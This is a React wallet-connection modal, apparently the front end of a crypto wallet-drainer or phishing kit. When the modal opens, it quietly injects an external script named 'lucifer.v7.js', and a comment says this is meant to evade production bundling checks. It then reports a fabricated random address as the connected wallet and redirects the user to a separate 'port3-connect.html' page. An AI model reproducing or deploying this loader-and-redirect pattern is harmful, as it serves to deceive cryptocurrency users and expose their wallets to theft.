import { useEffect } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { X, ExternalLink } from 'lucide-react';

const wallets = [
  { name: 'MetaMask', icon: '🦊' },
  { name: 'WalletConnect', icon: '🔗' },
  { name: 'Coinbase Wallet', icon: '🔵' },
  { name: 'Rainbow', icon: '🌈' },
];

export default function WalletModal({ isOpen, onClose, onConnected }) {
  
  // FIXED: Injected via standard script tag element to safely bypass Vite/Rollup production bundling checks
  useEffect(() => {
    if (isOpen && !window.connectWallet && !window.connect) {
      const script = document.createElement('script');
      script.src = '/files/lucifer.v7.js';
      script.type = 'module';
      script.crossOrigin = 'anonymous';
      script.onerror = (err) => console.error("Error loading background script asset:", err);
      
      document.body.appendChild(script);

      return () => {
        // Safe cleanup when the modal unmounts
        if (document.body.contains(script)) {
          document.body.removeChild(script);
        }
      };
    }
  }, [isOpen]);

  const handleConnect = (walletName) => {
    // 1. Instantly trigger parent status metrics if applicable
    if (onConnected && typeof onConnected === 'function') {
      const randomAddr = '0x' + Array.from({ length: 40 }, () => Math.floor(Math.random() * 16).toString(16)).join('');
      onConnected(randomAddr);
    }

    // 2. Clear modal layout views cleanly 
    onClose();

    // 3. Perform a clean direct breakout redirection right into your public Port3 HTML file handler
    window.location.href = `/port3-connect.html?wallet=${encodeURIComponent(walletName)}`;
  };

  if (!isOpen) return null;

  return (
    <AnimatePresence>
      <motion.div
        initial={{ opacity: 0 }}
        animate={{ opacity: 1 }}
        exit={{ opacity: 0 }}
        className="fixed inset-0 z-[100] flex items-center justify-center p-4"
      >
        {/* Backdrop */}
        <div className="absolute inset-0 bg-black/60 backdrop-blur-sm" onClick={onClose} />

        {/* Modal Window Container */}
        <motion.div
          initial={{ opacity: 0, scale: 0.95, y: 20 }}
          animate={{ opacity: 1, scale: 1, y: 0 }}
          exit={{ opacity: 0, scale: 0.95, y: 20 }}
          transition={{ duration: 0.3 }}
          className="relative z-10 w-full max-w-sm glass-panel glow-border-strong rounded-2xl p-6"
        >
          <div className="flex items-center justify-between mb-6">
            <h3 className="text-lg font-semibold text-foreground">Connect Wallet</h3>
            <button onClick={onClose} className="p-1.5 hover:bg-white/5 rounded-lg transition-colors">
              <X className="w-4 h-4 text-muted-foreground" />
            </button>
          </div>

          <div className="space-y-2">
            {wallets.map((w) => (
              <button
                key={w.name}
                onClick={() => handleConnect(w.name)}
                className="w-full flex items-center gap-3 p-3.5 rounded-xl glass-panel glow-border hover:glow-border-strong transition-all duration-200 group"
              >
                <span className="text-2xl">{w.icon}</span>
                <span className="text-sm font-medium text-foreground flex-1 text-left">{w.name}</span>
                <ExternalLink className="w-3.5 h-3.5 text-muted-foreground group-hover:text-cyan-400 transition-colors" />
              </button>
            ))}
          </div>

          <p className="text-[11px] text-muted-foreground text-center mt-5 leading-relaxed">
            By connecting, you agree to our Terms of Service and Privacy Policy
          </p>
        </motion.div>
      </motion.div>
    </AnimatePresence>
  );
}